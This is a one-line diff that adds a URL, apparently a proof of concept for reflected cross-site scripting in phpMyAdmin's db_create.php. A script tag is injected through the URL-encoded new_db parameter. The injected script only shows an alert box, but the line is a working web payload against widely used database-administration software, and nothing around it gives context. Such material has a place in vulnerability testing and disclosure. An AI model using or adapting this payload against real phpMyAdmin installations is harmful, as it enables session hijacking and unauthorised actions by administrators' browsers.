@@ -1,0 +1,1 @@
+http://www.example.com/phpmyadmin/db_create.php?token=567eb60e7b1692f64df9251ab7ae3934&reload=1&new_db=%3Cscript%3Ealert%28%2Fliscker%2F%29%3B%3C%2Fscript%3E&db_collation=
